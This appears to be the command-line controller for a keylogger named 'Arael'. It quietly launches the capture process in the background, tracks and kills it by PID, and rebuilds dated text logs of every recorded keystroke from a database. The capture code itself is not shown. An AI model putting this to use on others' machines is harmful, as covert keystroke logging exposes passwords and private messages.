import argparse
import subprocess
import os
import signal
import sys
from src.models import Keystroke
from src.db import SessionLocal
from collections import defaultdict
from pathlib import Path

def exposed(func):
    func._is_exposed = True
    return func

class CTLManager:
    def __init__(self, path=None):
        self.PID_FILE = path or Path.home() / ".arael.pid"

    def get_pid(self):
        if self.PID_FILE.exists():
            with open(self.PID_FILE) as f:
                return int(f.read().strip())
        return None

    def is_running(self, pid):
        try:
            os.kill(pid, 0)
            return True
        except:
            return False

    @exposed
    def start(self, verbose=False):
        """Start the keylogger."""
        if self.PID_FILE.exists():
            pid = self.get_pid()
            if pid and self.is_running(pid):
                print(f"already running at PID - {pid}")
                return
            else:
                self.PID_FILE.unlink(missing_ok=True)

        stdout = None if verbose else subprocess.DEVNULL
        stderr = None if verbose else subprocess.DEVNULL

        proc = subprocess.Popen(
            [sys.executable, '-m', 'src.arael'],
            stdout=stdout,
            stderr=stderr,
            # cwd=Path(__file__).resolve().parent
        )

        with open(self.PID_FILE, "w") as f:
            f.write(str(proc.pid))

        print(f"arael has awakened and is watching you at PID: {proc.pid}")

    @exposed
    def stop(self):
        """Stop the keylogger."""
        pid = self.get_pid()
        if pid is None:
            print("Arael not running")
            return
        try:
            os.kill(pid, signal.SIGTERM)
            print("Arael stopped")
        except OSError as e:
            print("Could not kill process")
            print(e)
        finally:
            self.PID_FILE.unlink(missing_ok=True)

    @exposed
    def status(self):
        """Check if Arael is running."""
        pid = self.get_pid()
        if pid and self.is_running(pid):
            print(f"Arael is running (PID {pid})")
        else:
            print("Arael is not running")

    @exposed
    def get_logs(self):
        """Rebuild text log files from database."""
        db = SessionLocal()
        rows = db.query(Keystroke).order_by(Keystroke.timestamp.asc()).all()

        grouped = defaultdict(list)
        for row in rows:
            date = row.timestamp.strftime("%Y-%m-%d")
            time = row.timestamp.strftime("%H:%M:%S")
            grouped[date].append(f"[{time}] {row.key}")

        log_dir = Path("logs")
        log_dir.mkdir(exist_ok=True)

        for date, lines in grouped.items():
            with open(log_dir / f"{date}.txt", "w") as f:
                f.write("\n".join(lines))

        print(f"regenerated logs for {len(grouped)} day(s)")

    @exposed
    def help(self):
        """Show this help message."""
        print("\nArael CLI — Available Commands:\n")
        for name in dir(self):
            method = getattr(self, name)
            if callable(method) and getattr(method, "_is_exposed", False):
                doc = method.__doc__ or "(no description)"
                sig = "(--verbose)" if name == "start" else ""
                print(f"  {name:<10} {sig:<12} : {doc.strip()}")
        print()